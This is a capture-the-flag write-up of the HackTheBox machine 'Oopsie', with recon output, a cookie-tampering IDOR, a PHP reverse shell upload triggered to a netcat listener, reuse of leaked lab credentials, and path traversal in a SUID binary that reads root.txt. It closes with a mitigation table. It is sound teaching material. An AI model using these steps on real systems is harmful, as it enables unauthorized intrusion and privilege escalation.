# Oopsie — HackTheBox

**Platform:** HackTheBox
**Machine:** Oopsie
**Difficulty:** Easy
**OS:** Linux
**Date:** 06/06/2026
**Tags:** #enum #foothold #privesc #webattack #burpsuite #proxy
**Status:** Retired ✅

## TL;DR

Initial access abuses an **IDOR (Insecure Direct Object Reference)** in an admin panel: authorization is controlled solely by plaintext cookies (`user` and `role`), with no server-side validation. By tampering with the `id` URL parameter and the cookie values, it was possible to impersonate the admin user and unlock the **file upload** feature, which does not validate the uploaded file's extension — allowing a PHP webshell upload and remote code execution (RCE) as `www-data`.

Credentials leaked in a configuration file (`db.php`) allowed pivoting to the `robert` user. The final privilege escalation abuses a **SUID** binary (`bugtracker`, owned by the `bugtracker` group) vulnerable to **path traversal**: it concatenates user input directly into a `cat` call with no sanitization, allowing arbitrary file reads as root — including `root.txt`.

**Attack chain:** IDOR/Cookie tampering → Unrestricted file upload → RCE (www-data) → Credentials in config file → Path traversal in SUID binary → root

---

## 1. Recon

### 1.1 Nmap enumeration

```
┌──(gabriel㉿gabriel)-[~/Documents/htb]
└─$ nmap -sC -sV 10.129.235.248
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 08:28 -0300
Nmap scan report for 10.129.235.248
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds
```

Only two open ports: **SSH (22)** and **HTTP (80)** running Apache 2.4.29 on Ubuntu. No obviously vulnerable version at first glance — the attack path is likely in the web application itself.

### 1.2 Directory enumeration with Gobuster

```
┌──(gabriel㉿gabriel)-[~/Documents/htb]
└─$ gobuster dir -u http://10.129.235.248 -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.235.248
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 279]
.htaccess            (Status: 403) [Size: 279]
.htpasswd            (Status: 403) [Size: 279]
css                  (Status: 301) [Size: 314] [--> http://10.129.235.248/css/]
fonts                (Status: 301) [Size: 316] [--> http://10.129.235.248/fonts/]
images               (Status: 301) [Size: 317] [--> http://10.129.235.248/images/]
index.php            (Status: 200) [Size: 10932]
js                   (Status: 301) [Size: 313] [--> http://10.129.235.248/js/]
server-status        (Status: 403) [Size: 279]
themes               (Status: 301) [Size: 317] [--> http://10.129.235.248/themes/]
uploads              (Status: 301) [Size: 318] [--> http://10.129.235.248/uploads/]
```

The `/uploads` directory stands out as a possible exploitation vector for later. Otherwise nothing else relevant — every page on the main site is static and leads nowhere:

![Main site homepage](assets/01-site-home.png)

---

## 2. Foothold

### 2.1 Discovering the admin panel

While intercepting traffic with Burp Suite, I found a URL not listed by gobuster (referenced from a static resource on the page):

**`http://10.129.235.248/cdn-cgi/login/`**

![/cdn-cgi/login/ panel](assets/02-cdn-cgi-login.png)
![Login screen](assets/03-login-page.png)

The login requires credentials, but offers a **guest** access option:

![Guest access option](assets/04-guest-access.png)

Logging in as guest, I reach the `/uploads` section, which requires super-admin permissions:

![/uploads requires super admin](assets/05-uploads-superadmin-required.png)

### 2.2 IDOR — escalating from guest to admin via cookies

Inspecting the session cookies, I notice authorization is controlled entirely client-side, **in plaintext**, with no signed token or server-side validation:

| Cookie  | Value (guest) |
|---------|---------------|
| `user`  | `2233`        |
| `role`  | `guest`       |

The "Account" section of the panel displays my data (ID, name, email), and the URL reveals the parameter controlling it:

![Account page showing the ID in the URL](assets/06-account-page-idor.png)

```
http://10.129.235.248/cdn-cgi/login/admin.php?content=accounts&id=2
```

Changing the `id` in the URL from `2` to `1` reveals the **admin** user's data — a textbook IDOR, with no object-level access control:

```
Access ID: 34322
Name: admin
```

With the admin's `Access ID`, I update the session cookies (`user=34322`, `role=admin`) and the upload section unlocks:

![Upload section unlocked as admin](assets/07-upload-unlocked.png)

### 2.3 Unrestricted file upload → RCE

The upload endpoint does not validate the uploaded file's extension. I used Kali Linux's default PHP webshell (`/usr/share/webshells/php-reverse-shell.php`), only changing the IP and port to point at my listener, and uploaded it to the server.

The `/uploads` folder blocks direct directory listing from the browser:

![/uploads directory listing blocked](assets/08-uploads-listing-blocked.png)

That doesn't prevent the uploaded file from being executed. With a `netcat` listener running in another terminal, I trigger the file via `curl`:

```bash
# terminal 1 — listener
nc -lvnp 1234

# terminal 2 — trigger the webshell
curl http://10.129.235.248/uploads/oopsie.php
```

![Reverse shell received](assets/09-reverse-shell.png)

Reverse shell received as `www-data`.

---

## 3. Privilege escalation

### 3.1 www-data → robert (credentials in config file)

Digging through `/var/www/html/cdn-cgi/login`, I find configuration files with plaintext credentials:

```
$ cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>

$ cat index.php
<?php
if(isset($_GET["guest"]))
{
        $cookie_name = "user";
        $cookie_value = "2233";
        setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/");
        setcookie('role','guest', time() + (86400 * 30), "/");
        header('Location: /cdn-cgi/login/admin.php');
}
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
{
        $cookie_name = "user";
        $cookie_value = "34322";
        setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/");
        setcookie('role','admin', time() + (86400 * 30), "/");
        header('Location: /cdn-cgi/login/admin.php');
}
```

`index.php` confirms what the cookie inspection already suggested: the `user`/`role` values are accepted with no integrity check whatsoever. `db.php` leaks `robert`'s password, which turns out to be reused as their system password:

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@oopsie:/var/www/html/cdn-cgi/login$ su - robert
Password: M3g4C0rpUs3r!

robert@oopsie:~$
```

### 3.2 robert → root (path traversal in a SUID binary)

Checking the groups on the machine, one stands out — `robert` is a member of it:

```
bugtracker:x:1001:robert
```

Looking for files owned by that group:

```
robert@oopsie:~$ find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker
```

```
robert@oopsie:~$ file /usr/bin/bugtracker
/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
```

A **SUID** binary owned by root, and **not stripped** — original symbol and function names are intact, which makes analysis much easier.

Listing exported functions:

```
robert@oopsie:~$ nm /usr/bin/bugtracker | grep -i ' T '
000000000000096a T concat
0000000000000b24 T _fini
0000000000000770 T _init
0000000000000b20 T __libc_csu_fini
0000000000000ab0 T __libc_csu_init
00000000000009da T main
0000000000000860 T _start
```

And the strings embedded in the binary:

```
robert@oopsie:~$ strings /usr/bin/bugtracker
...
setuid
strcpy
system
geteuid
...
------------------
: EV Bug Tracker :
------------------
Provide Bug ID:
---------------
cat /root/reports/
...
```

The binary builds and executes (via `system()`) the command `cat /root/reports/<user input>`, with no sanitization of the supplied value. Since the binary runs as SUID root, this is a direct **path traversal** primitive for arbitrary file reads:

```
robert@oopsie:/usr/bin$ bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
---------------

Binary package hint: ev-engine-lib
Version: 3.3.3-1
Reproduce:
When loading library in firmware it seems to be crashed
...
```

Injecting `../` in place of the ID escapes the `/root/reports/` directory and reads arbitrary files as root — including the final flag:

```
robert@oopsie:/usr/bin$ bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ../root.txt
---------------

af13b0be...eacf
```

---

## 4. Root cause & mitigation

| # | Vulnerability | Root cause | Mitigation |
|---|---|---|---|
| 1 | IDOR / authorization bypass | Authorization decided entirely by plaintext cookies, no server-side role validation | Enforce permission checks on the backend for every sensitive request; use signed/opaque sessions (e.g. a signed JWT or server-side session ID) instead of predictable cookie values |
| 2 | Unrestricted file upload | No extension/MIME type validation on the upload endpoint | Whitelist allowed extensions, rename uploaded files, serve uploads outside the webroot or without execute permission |
| 3 | Plaintext credentials in source | Database password hardcoded in `db.php`, reachable if an attacker achieves LFI/RCE | Use environment variables or a secrets manager; never commit credentials to source control |
| 4 | Path traversal in a SUID binary | User input concatenated directly into a `system("cat ...")` call with no sanitization | Never call `system()`/`exec()` with user input; use direct syscalls (`open`/`read`) with path validation, or drop SUID in favor of scoped `sudo` rules |

---

## 5. Lessons learned

- Unsigned, unencrypted cookies should never carry authorization decisions — the client side is always hostile territory.
- **Not stripped** SUID binaries are high-value targets: `nm`/`strings` reveal almost the entire behavior without heavy reverse engineering.
- Always check the web application's config files after landing RCE — password reuse (`robert` on the site = `robert` on the system) is extremely common in real environments too.
